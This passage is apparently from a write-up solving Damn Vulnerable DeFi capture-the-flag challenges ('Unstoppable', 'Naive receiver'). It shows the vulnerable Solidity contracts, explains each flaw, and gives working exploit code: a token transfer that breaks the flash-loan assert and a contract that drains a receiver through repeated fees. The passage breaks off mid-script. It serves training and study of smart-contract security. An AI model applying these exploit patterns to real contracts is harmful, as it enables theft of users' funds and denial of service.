balanceOf;</span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint))  public  allowance;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">        <span class="title function_">deposit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] += msg.<span class="property">value</span>;</span><br><span class="line">        emit <span class="title class_">Deposit</span>(msg.<span class="property">sender</span>, msg.<span class="property">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint wad</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.<span class="property">sender</span>] &gt;= wad);</span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] -= wad;</span><br><span class="line">        msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(wad);</span><br><span class="line">        emit <span class="title class_">Withdrawal</span>(msg.<span class="property">sender</span>, wad);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">totalSupply</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address guy, uint wad</span>) public returns (bool) &#123;</span><br><span class="line">        allowance[msg.<span class="property">sender</span>][guy] = wad;</span><br><span class="line">        emit <span class="title class_">Approval</span>(msg.<span class="property">sender</span>, guy, wad);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address dst, uint wad</span>) public returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, dst, wad);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address src, address dst, uint wad</span>)</span><br><span class="line">        public</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[src] &gt;= wad);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (src != msg.<span class="property">sender</span> &amp;&amp; allowance[src][msg.<span class="property">sender</span>] != <span class="title function_">uint</span>(-<span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="built_in">require</span>(allowance[src][msg.<span class="property">sender</span>] &gt;= wad);</span><br><span class="line">            allowance[src][msg.<span class="property">sender</span>] -= wad;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        balanceOf[src] -= wad;</span><br><span class="line">        balanceOf[dst] += wad;</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">Transfer</span>(src, dst, wad);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><p>There’s a lending pool with a million DVT tokens in balance, offering flash loans for free.</p>
<p>If only there was a way to attack and stop the pool from offering flash loans …</p>
<p>You start with 100 DVT tokens in balance.</p>
<h3 id="UnstoppableLender-sol"><a href="#UnstoppableLender-sol" class="headerlink" title="UnstoppableLender.sol"></a>UnstoppableLender.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveTokens</span>(<span class="params">address tokenAddress, uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">UnstoppableLender</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">UnstoppableLender</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">IERC20</span> public immutable damnValuableToken;</span><br><span class="line">    uint256 public poolBalance;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address tokenAddress</span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(tokenAddress != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;Token address cannot be zero&quot;</span>);</span><br><span class="line">        damnValuableToken = <span class="title class_">IERC20</span>(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">depositTokens</span>(<span class="params">uint256 amount</span>) external nonReentrant &#123;</span><br><span class="line">        <span class="built_in">require</span>(amount &gt; <span class="number">0</span>, <span class="string">&quot;Must deposit at least one token&quot;</span>);</span><br><span class="line">        <span class="comment">// Transfer token from sender. Sender must have first approved them.</span></span><br><span class="line">        damnValuableToken.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">        poolBalance = poolBalance + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256 borrowAmount</span>) external nonReentrant &#123;</span><br><span class="line">        <span class="built_in">require</span>(borrowAmount &gt; <span class="number">0</span>, <span class="string">&quot;Must borrow at least one token&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = damnValuableToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceBefore &gt;= borrowAmount, <span class="string">&quot;Not enough tokens in pool&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Ensured by the protocol via the `depositTokens` function</span></span><br><span class="line">        <span class="title function_">assert</span>(poolBalance == balanceBefore);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, borrowAmount);</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">IReceiver</span>(msg.<span class="property">sender</span>).<span class="title function_">receiveTokens</span>(<span class="title function_">address</span>(damnValuableToken), borrowAmount);</span><br><span class="line">        </span><br><span class="line">        uint256 balanceAfter = damnValuableToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceAfter &gt;= balanceBefore, <span class="string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ReceiverUnstoppable-sol"><a href="#ReceiverUnstoppable-sol" class="headerlink" title="ReceiverUnstoppable.sol"></a>ReceiverUnstoppable.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../unstoppable/UnstoppableLender.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">ReceiverUnstoppable</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">ReceiverUnstoppable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">UnstoppableLender</span> private immutable pool;</span><br><span class="line">    address private immutable owner;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address poolAddress</span>) &#123;</span><br><span class="line">        pool = <span class="title class_">UnstoppableLender</span>(poolAddress);</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pool will call this function during the flash loan</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveTokens</span>(<span class="params">address tokenAddress, uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == <span class="title function_">address</span>(pool), <span class="string">&quot;Sender must be pool&quot;</span>);</span><br><span class="line">        <span class="comment">// Return all tokens to the pool</span></span><br><span class="line">        <span class="built_in">require</span>(<span class="title class_">IERC20</span>(tokenAddress).<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, amount), <span class="string">&quot;Transfer of tokens failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">executeFlashLoan</span>(<span class="params">uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner, <span class="string">&quot;Only owner can execute flash loan&quot;</span>);</span><br><span class="line">        pool.<span class="title function_">flashLoan</span>(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge, we must stop the <code>UnstoppableLender</code> contract from giving <code>Flash Loans</code>. This is possible by exploiting the assert check inside the <code>flashLoan()</code> function; it checks if the balance of this contract is equal to the <code>poolBalance</code>, so if we transfer some tokens to the contract, the function raises the assertion error and reverts the flash loan.</p>
<h3 id="Unstoppable-py"><a href="#Unstoppable-py" class="headerlink" title="Unstoppable.py"></a>Unstoppable.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytest</span><br><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> DamnValuableToken, UnstoppableLender, ReceiverUnstoppable, accounts, exceptions</span><br><span class="line">TOKENS_IN_POOL = <span class="number">1000000</span></span><br><span class="line">INITIAL_ATTACKER_TOKEN_BALANCE = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy</span>():</span><br><span class="line">    deployer, attacker, someuser = accounts[:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    token = DamnValuableToken.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    pool = UnstoppableLender.deploy(token.address, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    token.approve(pool.address, TOKENS_IN_POOL, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    pool.depositTokens(TOKENS_IN_POOL, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE, &#123;</span><br><span class="line">                   <span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(pool.address) == TOKENS_IN_POOL</span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(attacker.address) == INITIAL_ATTACKER_TOKEN_BALANCE</span><br><span class="line"></span><br><span class="line">    receivercontract = ReceiverUnstoppable.deploy(</span><br><span class="line">        pool.address, &#123;<span class="string">&#x27;from&#x27;</span>: someuser&#125;)</span><br><span class="line">    receivercontract.executeFlashLoan(<span class="number">10</span>, &#123;<span class="string">&#x27;from&#x27;</span>: someuser&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deployer, attacker, someuser, token, pool, receivercontract</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">token, pool, attacker</span>):</span><br><span class="line">    token.transfer(pool.address, INITIAL_ATTACKER_TOKEN_BALANCE, &#123;</span><br><span class="line">        <span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">receivercontract, someuser</span>):</span><br><span class="line">    <span class="keyword">with</span> pytest.raises(exceptions.VirtualMachineError):</span><br><span class="line">        tx = receivercontract.executeFlashLoan(<span class="number">10</span>, &#123;<span class="string">&#x27;from&#x27;</span>: someuser&#125;)</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">bool</span>(tx.status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer, attacker, someuser, token, pool, receivercontract = deploy()</span><br><span class="line"></span><br><span class="line">    exploit(token, pool, attacker)</span><br><span class="line"></span><br><span class="line">    after(receivercontract, someuser)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Naive-receiver"><a href="#Naive-receiver" class="headerlink" title="Naive receiver"></a>Naive receiver</h2><p>There’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.</p>
<p>You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.</p>
<p>Drain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus ;)</p>
<h3 id="NaiveReceiverLenderPool-sol"><a href="#NaiveReceiverLenderPool-sol" class="headerlink" title="NaiveReceiverLenderPool.sol"></a>NaiveReceiverLenderPool.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">NaiveReceiverLenderPool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">NaiveReceiverLenderPool</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    uint256 private constant <span class="variable constant_">FIXED_FEE</span> = <span class="number">1</span> ether; <span class="comment">// not the cheapest flash loan</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">fixedFee</span>(<span class="params"></span>) external pure returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">FIXED_FEE</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">address borrower, uint256 borrowAmount</span>) external nonReentrant &#123;</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">        <span class="built_in">require</span>(balanceBefore &gt;= borrowAmount, <span class="string">&quot;Not enough ETH in pool&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(borrower.<span class="title function_">isContract</span>(), <span class="string">&quot;Borrower must be a deployed contract&quot;</span>);</span><br><span class="line">        <span class="comment">// Transfer ETH and handle control to receiver</span></span><br><span class="line">        borrower.<span class="title function_">functionCallWithValue</span>(</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(</span><br><span class="line">                <span class="string">&quot;receiveEther(uint256)&quot;</span>,</span><br><span class="line">                <span class="variable constant_">FIXED_FEE</span></span><br><span class="line">            ),</span><br><span class="line">            borrowAmount</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> &gt;= balanceBefore + <span class="variable constant_">FIXED_FEE</span>,</span><br><span class="line">            <span class="string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allow deposits of ETH</span></span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FlashLoanReceiver-sol"><a href="#FlashLoanReceiver-sol" class="headerlink" title="FlashLoanReceiver.sol"></a>FlashLoanReceiver.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">FlashLoanReceiver</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">FlashLoanReceiver</span> &#123;</span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line"></span><br><span class="line">    address payable private pool;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address payable poolAddress</span>) &#123;</span><br><span class="line">        pool = poolAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function called by the pool during flash loan</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveEther</span>(<span class="params">uint256 fee</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == pool, <span class="string">&quot;Sender must be pool&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uint256 amountToBeRepaid = msg.<span class="property">value</span> + fee;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> &gt;= amountToBeRepaid, <span class="string">&quot;Cannot borrow that much&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">_executeActionDuringFlashLoan</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Return funds to pool</span></span><br><span class="line">        pool.<span class="title function_">sendValue</span>(amountToBeRepaid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Internal function where the funds received are used</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_executeActionDuringFlashLoan</span>(<span class="params"></span>) internal &#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allow deposits of ETH</span></span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge, we need to drain the balance of <code>FlashLoanReceiver</code> since anyone can execute the <code>flashLoan()</code> function inside the <code>NaiveReceiverLenderPool</code> contract providing the address of <code>FlashLoanReceiver</code>. We can do the same and deduct <code>FIXED_FEE</code> 1 ether from the <code>FlashLoanReceiver</code> contract. To do this in one transaction, we can deploy a smart contract and call the <code>flashLoan</code> function until we drain the balance.</p>
<h3 id="naivereciever-exploit-sol"><a href="#naivereciever-exploit-sol" class="headerlink" title="naivereciever_exploit.sol"></a>naivereciever_exploit.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">FlashLoanReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">address borrower, uint256 borrowAmount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract naivereciever_Exploit &#123;</span><br><span class="line">    <span class="title class_">FlashLoanReceiver</span> pool;</span><br><span class="line">    address receiver;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address, address __address</span>) &#123;</span><br><span class="line">        pool = <span class="title class_">FlashLoanReceiver</span>(_address);</span><br><span class="line">        receiver = __address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="keyword">while</span> (receiver.<span class="property">balance</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            pool.<span class="title function_">flashLoan</span>(receiver, <span class="title function_">address</span>(pool).<span class="property">balance</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="naivereciever-py"><a href="#naivereciever-py" class="headerlink" title="naivereciever.py"></a>naivereciever.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> NaiveReceiverLenderPool, FlashLoanReceiver, naivereciever_Exploit, accounts, Wei</span><br><span class="line">ETHER_IN_POOL = <span class="number">1000</span></span><br><span class="line">ETHER_IN_RECEIVER = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy</span>():</span><br><span class="line">    deployer, attacker, someuser = accounts[:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    pool = NaiveReceiverLenderPool.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    deployer.transfer(to=pool, amount=Wei(<span class="string">f&#x27;<span class="subst">&#123;ETHER_IN_POOL&#125;</span> ether&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> pool.balance() == Wei(<span class="string">f&#x27;<span class="subst">&#123;ETHER_IN_POOL&#125;</span> ether&#x27;</span>)</span><br><span class="line">    <span class="keyword">assert</span> pool.fixedFee() == Wei(<span class="string">&#x27;1 ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    receiver = FlashLoanReceiver.deploy(pool, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    deployer.transfer(to=receiver, amount=Wei(<span class="string">f&#x27;<span 